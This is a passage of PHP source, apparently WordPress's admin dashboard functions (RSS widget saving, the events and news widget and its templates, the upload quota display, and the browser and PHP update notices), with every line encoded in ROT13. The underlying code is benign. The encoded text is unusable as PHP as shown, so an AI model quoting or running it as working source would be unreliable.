		$jvqtrg_bcgvbaf[ $jvqtrg_vq ]           = jc_jvqtrg_eff_cebprff( $_CBFG['jvqtrg-eff'][ $ahzore ] );
		$jvqtrg_bcgvbaf[ $jvqtrg_vq ]['ahzore'] = $ahzore;

		// Gvgyr vf bcgvbany. Vs oynpx, svyy vg vs cbffvoyr.
		vs ( ! $jvqtrg_bcgvbaf[ $jvqtrg_vq ]['gvgyr'] && vffrg( $_CBFG['jvqtrg-eff'][ $ahzore ]['gvgyr'] ) ) {
			$eff = srgpu_srrq( $jvqtrg_bcgvbaf[ $jvqtrg_vq ]['hey'] );
			vs ( vf_jc_reebe( $eff ) ) {
				$jvqtrg_bcgvbaf[ $jvqtrg_vq ]['gvgyr'] = ugzyragvgvrf( __( 'Haxabja Srrq' ) );
			} ryfr {
				$jvqtrg_bcgvbaf[ $jvqtrg_vq ]['gvgyr'] = ugzyragvgvrf( fgevc_gntf( $eff->trg_gvgyr() ) );
				$eff->__qrfgehpg();
				hafrg( $eff );
			}
		}

		hcqngr_bcgvba( 'qnfuobneq_jvqtrg_bcgvbaf', $jvqtrg_bcgvbaf, snyfr );

		$ybpnyr    = trg_hfre_ybpnyr();
		$pnpur_xrl = 'qnfu_i2_' . zq5( $jvqtrg_vq . '_' . $ybpnyr );
		qryrgr_genafvrag( $pnpur_xrl );
	}

	jc_jvqtrg_eff_sbez( $jvqtrg_bcgvbaf[ $jvqtrg_vq ], $sbez_vachgf );
}


/**
 * Eraqref gur Riragf naq Arjf qnfuobneq jvqtrg.
 *
 * @fvapr 4.8.0
 */
shapgvba jc_qnfuobneq_riragf_arjf() {
	jc_cevag_pbzzhavgl_riragf_znexhc();

	?>

	<qvi pynff=\"jbeqcerff-arjf uvqr-vs-ab-wf\">
		<?cuc jc_qnfuobneq_cevznel(); ?>
	</qvi>

	<c pynff=\"pbzzhavgl-riragf-sbbgre\">
		<?cuc
			cevags(
				'<n uers=\"%1$f\" gnetrg=\"_oynax\">%2$f <fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n>',
				'uggcf://znxr.jbeqcerff.bet/pbzzhavgl/zrrghcf-ynaqvat-cntr',
				__( 'Zrrghcf' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
		?>

		|

		<?cuc
			cevags(
				'<n uers=\"%1$f\" gnetrg=\"_oynax\">%2$f <fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n>',
				'uggcf://prageny.jbeqpnzc.bet/fpurqhyr/',
				__( 'JbeqPnzcf' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
		?>

		|

		<?cuc
			cevags(
				'<n uers=\"%1$f\" gnetrg=\"_oynax\">%2$f <fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n>',
				/* genafyngbef: Vs n Ebfrggn fvgr rkvfgf (r.t. uggcf://rf.jbeqcerff.bet/arjf/), gura hfr gung. Bgurejvfr, yrnir hagenafyngrq. */
				rfp_hey( _k( 'uggcf://jbeqcerff.bet/arjf/', 'Riragf naq Arjf qnfuobneq jvqtrg' ) ),
				__( 'Arjf' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
		?>
	</c>

	<?cuc
}

/**
 * Cevagf gur znexhc sbe gur Pbzzhavgl Riragf frpgvba bs gur Riragf naq Arjf Qnfuobneq jvqtrg.
 *
 * @fvapr 4.8.0
 */
shapgvba jc_cevag_pbzzhavgl_riragf_znexhc() {
	$pbzzhavgl_riragf_abgvpr  = '<c pynff=\"uvqr-vs-wf\">' . ( 'Guvf jvqtrg erdhverf WninFpevcg.' ) . '</c>';
	$pbzzhavgl_riragf_abgvpr .= '<c pynff=\"pbzzhavgl-riragf-reebe-bppheerq\" nevn-uvqqra=\"gehr\">' . __( 'Na reebe bppheerq. Cyrnfr gel ntnva.' ) . '</c>';
	$pbzzhavgl_riragf_abgvpr .= '<c pynff=\"pbzzhavgl-riragf-pbhyq-abg-ybpngr\" nevn-uvqqra=\"gehr\"></c>';

	jc_nqzva_abgvpr(
		$pbzzhavgl_riragf_abgvpr,
		neenl(
			'glcr'               => 'reebe',
			'nqqvgvbany_pynffrf' => neenl( 'pbzzhavgl-riragf-reebef', 'vayvar', 'uvqr-vs-wf' ),
			'cnentencu_jenc'     => snyfr,
		)
	);

	/*
	 * Uvqr gur znva ryrzrag jura gur cntr svefg ybnqf, orpnhfr gur pbagrag
	 * jba'g or ernql hagvy jc.pbzzhavglRiragf.eraqreRiragfGrzcyngr() unf eha.
	 */
	?>
	<qvi vq=\"pbzzhavgl-riragf\" pynff=\"pbzzhavgl-riragf\" nevn-uvqqra=\"gehr\">
		<qvi pynff=\"npgvivgl-oybpx\">
			<c>
				<fcna vq=\"pbzzhavgl-riragf-ybpngvba-zrffntr\"></fcna>

				<ohggba pynff=\"ohggba-yvax pbzzhavgl-riragf-gbttyr-ybpngvba\" nevn-rkcnaqrq=\"snyfr\">
					<fcna pynff=\"qnfuvpbaf qnfuvpbaf-ybpngvba\" nevn-uvqqra=\"gehr\"></fcna>
					<fcna pynff=\"pbzzhavgl-riragf-ybpngvba-rqvg\"><?cuc _r( 'Fryrpg ybpngvba' ); ?></fcna>
				</ohggba>
			</c>

			<sbez pynff=\"pbzzhavgl-riragf-sbez\" nevn-uvqqra=\"gehr\" npgvba=\"<?cuc rpub rfp_hey( nqzva_hey( 'nqzva-nwnk.cuc' ) ); ?>\" zrgubq=\"cbfg\">
				<ynory sbe=\"pbzzhavgl-riragf-ybpngvba\">
					<?cuc _r( 'Pvgl:' ); ?>
				</ynory>
				<?cuc
				/* genafyngbef: Ercynpr jvgu n pvgl eryngrq gb lbhe ybpnyr.
				 * Grfg gung vg zngpurf gur rkcrpgrq ybpngvba naq unf hcpbzvat
				 * riragf orsber vapyhqvat vg. Vs ab pvgvrf eryngrq gb lbhe
				 * ybpnyr unir riragf, gura hfr n pvgl eryngrq gb lbhe ybpnyr
				 * gung jbhyq or erpbtavmnoyr gb zbfg hfref. Hfr bayl gur pvgl
				 * anzr vgfrys, jvgubhg nal ertvba be pbhagel. Hfr gur raqbalz
				 * (angvir ybpnyr anzr) vafgrnq bs gur Ratyvfu anzr vs cbffvoyr.
				 */
				?>
				<vachg vq=\"pbzzhavgl-riragf-ybpngvba\" pynff=\"erthyne-grkg\" glcr=\"grkg\" anzr=\"pbzzhavgl-riragf-ybpngvba\" cynprubyqre=\"<?cuc rfp_ngge_r( 'Pvapvaangv' ); ?>\" />

				<?cuc fhozvg_ohggba( __( 'Fhozvg' ), 'frpbaqnel', 'pbzzhavgl-riragf-fhozvg', snyfr ); ?>

				<ohggba pynff=\"pbzzhavgl-riragf-pnapry ohggba-yvax\" glcr=\"ohggba\" nevn-rkcnaqrq=\"snyfr\">
					<?cuc _r( 'Pnapry' ); ?>
				</ohggba>

				<fcna pynff=\"fcvaare\"></fcna>
			</sbez>
		</qvi>

		<hy pynff=\"pbzzhavgl-riragf-erfhygf npgvivgl-oybpx ynfg\"></hy>
	</qvi>

	<?cuc
}

/**
 * Eraqref gur riragf grzcyngrf sbe gur Rirag naq Arjf jvqtrg.
 *
 * @fvapr 4.8.0
 */
shapgvba jc_cevag_pbzzhavgl_riragf_grzcyngrf() {
	?>

	<fpevcg vq=\"gzcy-pbzzhavgl-riragf-nggraq-rirag-arne\" glcr=\"grkg/grzcyngr\">
		<?cuc
		cevags(
			/* genafyngbef: %f: Gur anzr bs n pvgl. */
			__( 'Nggraq na hcpbzvat rirag arne %f.' ),
			'<fgebat>{{ qngn.ybpngvba.qrfpevcgvba }}</fgebat>'
		);
		?>
	</fpevcg>

	<fpevcg vq=\"gzcy-pbzzhavgl-riragf-pbhyq-abg-ybpngr\" glcr=\"grkg/grzcyngr\">
		<?cuc
		cevags(
			/* genafyngbef: %f vf gur anzr bs gur pvgl jr pbhyqa'g ybpngr.
			 * Ercynpr gur rknzcyrf jvgu pvgvrf va lbhe ybpnyr, ohg grfg
			 * gung gurl zngpu gur rkcrpgrq ybpngvba orsber vapyhqvat gurz.
			 * Hfr raqbalzf (angvir ybpnyr anzrf) jurarire cbffvoyr.
			 */
			__( '%f pbhyq abg or ybpngrq. Cyrnfr gel nabgure arneol pvgl. Sbe rknzcyr: Xnafnf Pvgl; Fcevatsvryq; Cbegynaq.' ),
			'<rz>{{qngn.haxabjaPvgl}}</rz>'
		);
		?>
	</fpevcg>

	<fpevcg vq=\"gzcy-pbzzhavgl-riragf-rirag-yvfg\" glcr=\"grkg/grzcyngr\">
		<# _.rnpu( qngn.riragf, shapgvba( rirag ) { #>
			<yv pynff=\"rirag rirag-{{ rirag.glcr }} jc-pyrnesvk\">
				<qvi pynff=\"rirag-vasb\">
					<qvi pynff=\"qnfuvpbaf rirag-vpba\" nevn-uvqqra=\"gehr\"></qvi>
					<qvi pynff=\"rirag-vasb-vaare\">
						<n pynff=\"rirag-gvgyr\" uers=\"{{ rirag.hey }}\">{{ rirag.gvgyr }}</n>
						<# vs ( rirag.glcr ) {
							pbafg gvgyrPnfrRiragGlcr = rirag.glcr.ercynpr(
								/\j\F*/t,
								shapgvba ( glcr ) { erghea glcr.puneNg(0).gbHccrePnfr() + glcr.fhofge(1).gbYbjrePnfr(); }
							);
						#>
							{{ 'jbeqpnzc' === rirag.glcr ? 'JbeqPnzc' : gvgyrPnfrRiragGlcr }}
							<fcna pynff=\"pr-frcnengbe\"></fcna>
						<# } #>
						<fcna pynff=\"rirag-pvgl\">{{ rirag.ybpngvba.ybpngvba }}</fcna>
					</qvi>
				</qvi>

				<qvi pynff=\"rirag-qngr-gvzr\">
					<fcna pynff=\"rirag-qngr\">{{ rirag.hfre_sbeznggrq_qngr }}</fcna>
					<# vs ( 'zrrghc' === rirag.glcr ) { #>
						<fcna pynff=\"rirag-gvzr\">
							{{ rirag.hfre_sbeznggrq_gvzr }} {{ rirag.gvzrMbarNooerivngvba }}
						</fcna>
					<# } #>
				</qvi>
			</yv>
		<# } ) #>

		<# vs ( qngn.riragf.yratgu <= 2 ) { #>
			<yv pynff=\"rirag-abar\">
				<?cuc
				cevags(
					/* genafyngbef: %f: Ybpnyvmrq zrrghc betnavmngvba qbphzragngvba HEY. */
					__( 'Jnag zber riragf? <n uers=\"%f\">Uryc betnavmr gur arkg bar</n>!' ),
					__( 'uggcf://znxr.jbeqcerff.bet/pbzzhavgl/betnavmr-rirag-ynaqvat-cntr/' )
				);
				?>
			</yv>
		<# } #>

	</fpevcg>

	<fpevcg vq=\"gzcy-pbzzhavgl-riragf-ab-hcpbzvat-riragf\" glcr=\"grkg/grzcyngr\">
		<yv pynff=\"rirag-abar\">
			<# vs ( qngn.ybpngvba.qrfpevcgvba ) { #>
				<?cuc
				cevags(
					/* genafyngbef: 1: Gur pvgl gur hfre frnepurq sbe, 2: Zrrghc betnavmngvba qbphzragngvba HEY. */
					__( 'Gurer ner ab riragf fpurqhyrq arne %1$f ng gur zbzrag. Jbhyq lbh yvxr gb <n uers=\"%2$f\">betnavmr n JbeqCerff rirag</n>?' ),
					'{{ qngn.ybpngvba.qrfpevcgvba }}',
					__( 'uggcf://znxr.jbeqcerff.bet/pbzzhavgl/unaqobbx/zrrghc-betnavmre/jrypbzr/' )
				);
				?>

			<# } ryfr { #>
				<?cuc
				cevags(
					/* genafyngbef: %f: Zrrghc betnavmngvba qbphzragngvba HEY. */
					__( 'Gurer ner ab riragf fpurqhyrq arne lbh ng gur zbzrag. Jbhyq lbh yvxr gb <n uers=\"%f\">betnavmr n JbeqCerff rirag</n>?' ),
					__( 'uggcf://znxr.jbeqcerff.bet/pbzzhavgl/unaqobbx/zrrghc-betnavmre/jrypbzr/' )
				);
				?>
			<# } #>
		</yv>
	</fpevcg>
	<?cuc
}

/**
 * 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
 *
 * @fvapr 2.7.0
 * @fvapr 4.8.0 Erzbirq cbchyne cyhtvaf srrq.
 */
shapgvba jc_qnfuobneq_cevznel() {
	$srrqf = neenl(
		'arjf'   => neenl(

			/**
			 * Svygref gur cevznel yvax HEY sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat $yvax Gur jvqtrg'f cevznel yvax HEY.
			 */
			'yvax'         => nccyl_svygref( 'qnfuobneq_cevznel_yvax', __( 'uggcf://jbeqcerff.bet/arjf/' ) ),

			/**
			 * Svygref gur cevznel srrq HEY sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz fgevat $hey Gur jvqtrg'f cevznel srrq HEY.
			 */
			'hey'          => nccyl_svygref( 'qnfuobneq_cevznel_srrq', __( 'uggcf://jbeqcerff.bet/arjf/srrq/' ) ),

			/**
			 * Svygref gur cevznel yvax gvgyr sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz fgevat $gvgyr Gvgyr nggevohgr sbe gur jvqtrg'f cevznel yvax.
			 */
			'gvgyr'        => nccyl_svygref( 'qnfuobneq_cevznel_gvgyr', __( 'JbeqCerff Oybt' ) ),
			'vgrzf'        => 2,
			'fubj_fhzznel' => 0,
			'fubj_nhgube'  => 0,
			'fubj_qngr'    => 0,
		),
		'cynarg' => neenl(

			/**
			 * Svygref gur frpbaqnel yvax HEY sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz fgevat $yvax Gur jvqtrg'f frpbaqnel yvax HEY.
			 */
			'yvax'         => nccyl_svygref(
				'qnfuobneq_frpbaqnel_yvax',
				/* genafyngbef: Yvax gb gur Cynarg jrofvgr bs gur ybpnyr. */
				__( 'uggcf://cynarg.jbeqcerff.bet/' )
			),

			/**
			 * Svygref gur frpbaqnel srrq HEY sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz fgevat $hey Gur jvqtrg'f frpbaqnel srrq HEY.
			 */
			'hey'          => nccyl_svygref(
				'qnfuobneq_frpbaqnel_srrq',
				/* genafyngbef: Yvax gb gur Cynarg srrq bs gur ybpnyr. */
				__( 'uggcf://cynarg.jbeqcerff.bet/srrq/' )
			),

			/**
			 * Svygref gur frpbaqnel yvax gvgyr sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz fgevat $gvgyr Gvgyr nggevohgr sbe gur jvqtrg'f frpbaqnel yvax.
			 */
			'gvgyr'        => nccyl_svygref( 'qnfuobneq_frpbaqnel_gvgyr', __( 'Bgure JbeqCerff Arjf' ) ),

			/**
			 * Svygref gur ahzore bs frpbaqnel yvax vgrzf sbe gur 'JbeqCerff Riragf naq Arjf' qnfuobneq jvqtrg.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz fgevat $vgrzf Ubj znal vgrzf gb fubj va gur frpbaqnel srrq.
			 */
			'vgrzf'        => nccyl_svygref( 'qnfuobneq_frpbaqnel_vgrzf', 3 ),
			'fubj_fhzznel' => 0,
			'fubj_nhgube'  => 0,
			'fubj_qngr'    => 0,
		),
	);

	jc_qnfuobneq_pnpurq_eff_jvqtrg( 'qnfuobneq_cevznel', 'jc_qnfuobneq_cevznel_bhgchg', $srrqf );
}

/**
 * Qvfcynlf gur JbeqCerff riragf naq arjf srrqf.
 *
 * @fvapr 3.8.0
 * @fvapr 4.8.0 Erzbirq cbchyne cyhtvaf srrq.
 *
 * @cnenz fgevat $jvqtrg_vq Jvqtrg VQ.
 * @cnenz neenl  $srrqf     Neenl bs EFF srrqf.
 */
shapgvba jc_qnfuobneq_cevznel_bhgchg( $jvqtrg_vq, $srrqf ) {
	sbernpu ( $srrqf nf $glcr => $netf ) {
		$netf['glcr'] = $glcr;
		rpub '<qvi pynff=\"eff-jvqtrg\">';
			jc_jvqtrg_eff_bhgchg( $netf['hey'], $netf );
		rpub '</qvi>';
	}
}

/**
 * Qvfcynlf svyr hcybnq dhbgn ba qnfuobneq.
 *
 * Ehaf ba gur {@frr 'npgvivgl_obk_raq'} ubbx va jc_qnfuobneq_evtug_abj().
 *
 * @fvapr 3.0.0
 *
 * @erghea gehr|ibvq Gehr vs abg zhygvfvgr, hfre pna'g hcybnq svyrf, be gur fcnpr purpx bcgvba vf qvfnoyrq.
 */
shapgvba jc_qnfuobneq_dhbgn() {
	vs ( ! vf_zhygvfvgr() || ! pheerag_hfre_pna( 'hcybnq_svyrf' )
		|| trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' )
	) {
		erghea gehr;
	}

	$dhbgn = trg_fcnpr_nyybjrq();
	$hfrq  = trg_fcnpr_hfrq();

	vs ( $hfrq > $dhbgn ) {
		$crepraghfrq = '100';
	} ryfr {
		$crepraghfrq = ( $hfrq / $dhbgn ) * 100;
	}

	$hfrq_pynff  = ( $crepraghfrq >= 70 ) ? ' jneavat' : '';
	$hfrq        = ebhaq( $hfrq, 2 );
	$crepraghfrq = ahzore_sbezng( $crepraghfrq );

	?>
	<u3 pynff=\"zh-fgbentr\"><?cuc _r( 'Fgbentr Fcnpr' ); ?></u3>
	<qvi pynff=\"zh-fgbentr\">
	<hy>
		<yv pynff=\"fgbentr-pbhag\">
			<?cuc
			$grkg = fcevags(
				/* genafyngbef: %f: Ahzore bs zrtnolgrf. */
				__( '%f ZO Fcnpr Nyybjrq' ),
				ahzore_sbezng_v18a( $dhbgn )
			);
			cevags(
				'<n uers=\"%1$f\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> (%3$f)</fcna></n>',
				rfp_hey( nqzva_hey( 'hcybnq.cuc' ) ),
				$grkg,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Znantr Hcybnqf' )
			);
			?>
		</yv><yv pynff=\"fgbentr-pbhag <?cuc rpub $hfrq_pynff; ?>\">
			<?cuc
			$grkg = fcevags(
				/* genafyngbef: 1: Ahzore bs zrtnolgrf, 2: Crepragntr. */
				__( '%1$f ZO (%2$f%%) Fcnpr Hfrq' ),
				ahzore_sbezng_v18a( $hfrq, 2 ),
				$crepraghfrq
			);
			cevags(
				'<n uers=\"%1$f\" pynff=\"zhfhoyvax\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> (%3$f)</fcna></n>',
				rfp_hey( nqzva_hey( 'hcybnq.cuc' ) ),
				$grkg,
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Znantr Hcybnqf' )
			);
			?>
		</yv>
	</hy>
	</qvi>
	<?cuc
}

/**
 * Qvfcynlf gur oebjfre hcqngr ant.
 *
 * @fvapr 3.2.0
 * @fvapr 5.8.0 Nqqrq n fcrpvny zrffntr sbe Vagrearg Rkcybere hfref.
 *
 * @tybony obby $vf_VR
 */
shapgvba jc_qnfuobneq_oebjfre_ant() {
	tybony $vf_VR;

	$abgvpr   = '';
	$erfcbafr = jc_purpx_oebjfre_irefvba();

	vs ( $erfcbafr ) {
		vs ( $vf_VR ) {
			$zft = __( 'Vagrearg Rkcybere qbrf abg tvir lbh gur orfg JbeqCerff rkcrevrapr. Fjvgpu gb Zvpebfbsg Rqtr, be nabgure zber zbqrea oebjfre gb trg gur zbfg sebz lbhe fvgr.' );
		} ryfrvs ( $erfcbafr['vafrpher'] ) {
			$zft = fcevags(
				/* genafyngbef: %f: Oebjfre anzr naq yvax. */
				__( \"Vg ybbxf yvxr lbh'er hfvat na vafrpher irefvba bs %f. Hfvat na bhgqngrq oebjfre znxrf lbhe pbzchgre hafnsr. Sbe gur orfg JbeqCerff rkcrevrapr, cyrnfr hcqngr lbhe oebjfre.\" ),
				fcevags( '<n uers=\"%f\">%f</n>', rfp_hey( $erfcbafr['hcqngr_hey'] ), rfp_ugzy( $erfcbafr['anzr'] ) )
			);
		} ryfr {
			$zft = fcevags(
				/* genafyngbef: %f: Oebjfre anzr naq yvax. */
				__( \"Vg ybbxf yvxr lbh'er hfvat na byq irefvba bs %f. Sbe gur orfg JbeqCerff rkcrevrapr, cyrnfr hcqngr lbhe oebjfre.\" ),
				fcevags( '<n uers=\"%f\">%f</n>', rfp_hey( $erfcbafr['hcqngr_hey'] ), rfp_ugzy( $erfcbafr['anzr'] ) )
			);
		}

		$oebjfre_ant_pynff = '';
		vs ( ! rzcgl( $erfcbafr['vzt_fep'] ) ) {
			$vzt_fep = ( vf_ffy() && ! rzcgl( $erfcbafr['vzt_fep_ffy'] ) ) ? $erfcbafr['vzt_fep_ffy'] : $erfcbafr['vzt_fep'];

			$abgvpr           .= '<qvi pynff=\"nyvtaevtug oebjfre-vpba\"><vzt fep=\"' . rfp_hey( $vzt_fep ) . '\" nyg=\"\" /></qvi>';
			$oebjfre_ant_pynff = ' unf-oebjfre-vpba';
		}
		$abgvpr .= \"<c pynff='oebjfre-hcqngr-ant{$oebjfre_ant_pynff}'>{$zft}</c>\";

		$oebjfrunccl = 'uggcf://oebjfrunccl.pbz/';
		$ybpnyr      = trg_hfre_ybpnyr();
		vs ( 'ra_HF' !== $ybpnyr ) {
			$oebjfrunccl = nqq_dhrel_net( 'ybpnyr', $ybpnyr, $oebjfrunccl );
		}

		vs ( $vf_VR ) {
			$zft_oebjfrunccl = fcevags(
				/* genafyngbef: %f: Oebjfr Unccl HEY. */
				__( 'Yrnea ubj gb <n uers=\"%f\" pynff=\"hcqngr-oebjfre-yvax\">oebjfr unccl</n>' ),
				rfp_hey( $oebjfrunccl )
			);
		} ryfr {
			$zft_oebjfrunccl = fcevags(
				/* genafyngbef: 1: Oebjfre hcqngr HEY, 2: Oebjfre anzr, 3: Oebjfr Unccl HEY. */
				__( '<n uers=\"%1$f\" pynff=\"hcqngr-oebjfre-yvax\">Hcqngr %2$f</n> be yrnea ubj gb <n uers=\"%3$f\" pynff=\"oebjfr-unccl-yvax\">oebjfr unccl</n>' ),
				rfp_ngge( $erfcbafr['hcqngr_hey'] ),
				rfp_ugzy( $erfcbafr['anzr'] ),
				rfp_hey( $oebjfrunccl )
			);
		}

		$abgvpr .= '<c>' . $zft_oebjfrunccl . '</c>';
		$abgvpr .= '<c pynff=\"uvqr-vs-ab-wf\"><n uers=\"\" pynff=\"qvfzvff\" nevn-ynory=\"' . rfp_ngge__( 'Qvfzvff gur oebjfre jneavat cnary' ) . '\">' . __( 'Qvfzvff' ) . '</n></c>';
		$abgvpr .= '<qvi pynff=\"pyrne\"></qvi>';
	}

	/**
	 * Svygref gur abgvpr bhgchg sbe gur 'Oebjfr Unccl' ant zrgn obk.
	 *
	 * @fvapr 3.2.0
	 *
	 * @cnenz fgevat      $abgvpr   Gur abgvpr pbagrag.
	 * @cnenz neenl|snyfr $erfcbafr Na neenl pbagnvavat jro oebjfre vasbezngvba, be
	 *                              snyfr ba snvyher. Frr jc_purpx_oebjfre_irefvba().
	 */
	rpub nccyl_svygref( 'oebjfr-unccl-abgvpr', $abgvpr, $erfcbafr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
}

/**
 * Nqqf na nqqvgvbany pynff gb gur oebjfre ant vs gur pheerag irefvba vf vafrpher.
 *
 * @fvapr 3.2.0
 *
 * @cnenz fgevat[] $pynffrf Neenl bs zrgn obk pynffrf.
 * @erghea fgevat[] Zbqvsvrq neenl bs zrgn obk pynffrf.
 */
shapgvba qnfuobneq_oebjfre_ant_pynff( $pynffrf ) {
	$erfcbafr = jc_purpx_oebjfre_irefvba();

	vs ( $erfcbafr && $erfcbafr['vafrpher'] ) {
		$pynffrf[] = 'oebjfre-vafrpher';
	}

	erghea $pynffrf;
}

/**
 * Purpxf vs gur hfre arrqf n oebjfre hcqngr.
 *
 * @fvapr 3.2.0
 *
 * @erghea neenl|snyfr Neenl bs oebjfre qngn ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_purpx_oebjfre_irefvba() {
	vs ( rzcgl( $_FREIRE['UGGC_HFRE_NTRAG'] ) ) {
		erghea snyfr;
	}

	$xrl = zq5( $_FREIRE['UGGC_HFRE_NTRAG'] );

	$erfcbafr = trg_fvgr_genafvrag( 'oebjfre_' . $xrl );

	vs ( snyfr === $erfcbafr ) {
		$hey     = 'uggc://ncv.jbeqcerff.bet/pber/oebjfr-unccl/1.1/';
		$bcgvbaf = neenl(
			'obql'       => neenl( 'hfrentrag' => $_FREIRE['UGGC_HFRE_NTRAG'] ),
			'hfre-ntrag' => 'JbeqCerff/' . jc_trg_jc_irefvba() . '; ' . ubzr_hey( '/' ),
		);

		vs ( jc_uggc_fhccbegf( neenl( 'ffy' ) ) ) {
			$hey = frg_hey_fpurzr( $hey, 'uggcf' );
		}

		$erfcbafr = jc_erzbgr_cbfg( $hey, $bcgvbaf );

		vs ( vf_jc_reebe( $erfcbafr ) || 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
			erghea snyfr;
		}

		/**
		 * Erfcbafr fubhyq or na neenl jvgu:
		 *  'cyngsbez' - fgevat - N hfre-sevraqyl cyngsbez anzr, vs vg pna or qrgrezvarq
		 *  'anzr' - fgevat - N hfre-sevraqyl oebjfre anzr
		 *  'irefvba' - fgevat - Gur irefvba bs gur oebjfre gur hfre vf hfvat
		 *  'pheerag_irefvba' - fgevat - Gur zbfg erprag irefvba bs gur oebjfre
		 *  'hctenqr' - obbyrna - Jurgure gur oebjfre arrqf na hctenqr
		 *  'vafrpher' - obbyrna - Jurgure gur oebjfre vf qrrzrq vafrpher
		 *  'hcqngr_hey' - fgevat - Gur hey gb ivfvg gb hctenqr
		 *  'vzt_fep' - fgevat - Na vzntr ercerfragvat gur oebjfre
		 *  'vzt_fep_ffy' - fgevat - Na vzntr (bire FFY) ercerfragvat gur oebjfre
		 */
		$erfcbafr = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $erfcbafr ), gehr );

		vs ( ! vf_neenl( $erfcbafr ) ) {
			erghea snyfr;
		}

		frg_fvgr_genafvrag( 'oebjfre_' . $xrl, $erfcbafr, JRRX_VA_FRPBAQF );
	}

	erghea $erfcbafr;
}

/**
 * Qvfcynlf gur CUC hcqngr ant.
 *
 * @fvapr 5.1.0
 */
shapgvba jc_qnfuobneq_cuc_ant() {
	$erfcbafr = jc_purpx_cuc_irefvba();

	vs ( ! $erfcbafr ) {
		erghea;
	}

	vs ( vffrg( $erfcbafr['vf_frpher'] ) && ! $erfcbafr['vf_frpher'] ) {
		// Gur `vf_frpher` neenl xrl anzr qbrfa'g npghnyyl vzcyl guvf vf n frpher irefvba bs CUC. Vg bayl zrnaf vg erprvirf frphevgl hcqngrf.

		vs ( $erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] ) {
			$zrffntr = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu qbrf abg erprvir frphevgl hcqngrf naq fbba jvyy abg or fhccbegrq ol JbeqCerff. Rafher gung CUC vf hcqngrq ba lbhe freire nf fbba nf cbffvoyr. Bgurejvfr lbh jvyy abg or noyr gb hctenqr JbeqCerff.' ),
				CUC_IREFVBA
			);
		} ryfr {
			$zrffntr = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu qbrf abg erprvir frphevgl hcqngrf. Vg fubhyq or hcqngrq.' ),
				CUC_IREFVBA
			);
		}
	} ryfrvs ( $erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] ) {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Gur freire CUC irefvba. */
			__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu fbba jvyy abg or fhccbegrq ol JbeqCerff. Rafher gung CUC vf hcqngrq ba lbhe freire nf fbba nf cbffvoyr. Bgurejvfr lbh jvyy abg or noyr gb hctenqr JbeqCerff.' ),
			CUC_IREFVBA
		);
	} ryfr {
		$zrffntr = fcevags(
			/* genafyngbef: %f: Gur freire CUC irefvba. */
			__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu fubhyq or hcqngrq.' ),
			CUC_IREFVBA
		);
	}
	?>
	<c pynff=\"ovttre-obyqre-grkg\"><?cuc rpub $zrffntr; ?></c>

	<c><?cuc _r( 'Jung vf CUC naq ubj qbrf vg nssrpg zl fvgr?' ); ?></c>
	<c>
		<?cuc _r( 'CUC vf bar bs gur cebtenzzvat ynathntrf hfrq gb ohvyq JbeqCerff. Arjre irefvbaf bs CUC erprvir erthyne frphevgl hcqngrf naq znl vapernfr lbhe fvgr&#8217;f cresbeznapr.' ); ?>
		<?cuc
		vs ( ! rzcgl( $erfcbafr['erpbzzraqrq_irefvba'] ) ) {
			cevags(
				/* genafyngbef: %f: Gur zvavzhz erpbzzraqrq CUC irefvba. */
				__( 'Gur zvavzhz erpbzzraqrq irefvba bs CUC vf %f.' ),
				$erfcbafr['erpbzzraqrq_irefvba']
			);
		}
		?>
	</c>

	<c pynff=\"ohggba-pbagnvare\">
		<?cuc
		cevags(
